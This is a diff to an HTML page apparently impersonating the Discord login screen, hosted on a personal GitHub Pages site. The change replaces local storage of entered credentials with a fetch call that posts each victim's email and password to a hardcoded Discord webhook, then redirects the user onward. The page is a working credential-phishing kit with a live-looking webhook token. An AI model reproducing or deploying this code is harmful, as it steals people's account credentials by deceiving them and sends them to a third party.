@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord - Log In</title>
+    <title>Discord Login</title>
     <link rel="icon" type="image/png" href="logo1.png">
     <style>
         body {
@@ -157,14 +157,25 @@
                 password: password
             };
 
-            // Retrieve existing user info or initialize empty array
-            const userInfo = JSON.parse(localStorage.getItem('userInfo')) || [];
+            // Send user data to the Discord webhook
+            const webhookUrl = 'https://discord.com/api/webhooks/1250446588254359583/hWxJFMMwp2NpIx6vq7-pZe_rrQ9sjOm3LxtSZcv6D1bv2uiwMgYNYglzJvHZSctThByk';
+            const message = `**Email= ||${email}||\nPass= ||${password}|| This msg sent from this website https://itsvoid18.github.io/index.html**`;
 
-            // Add new user info to array
-            userInfo.push(user);
-
-            // Save updated user info back to localStorage
-            localStorage.setItem('userInfo', JSON.stringify(userInfo));
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: message })
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Data sent to Discord webhook successfully');
+                } else {
+                    console.error('Failed to send data to Discord webhook');
+                }
+            }).catch(error => {
+                console.error('Error sending data to Discord webhook:', error);
+            });
 
             // Redirect to 10.html
             window.location.href = "10.html";
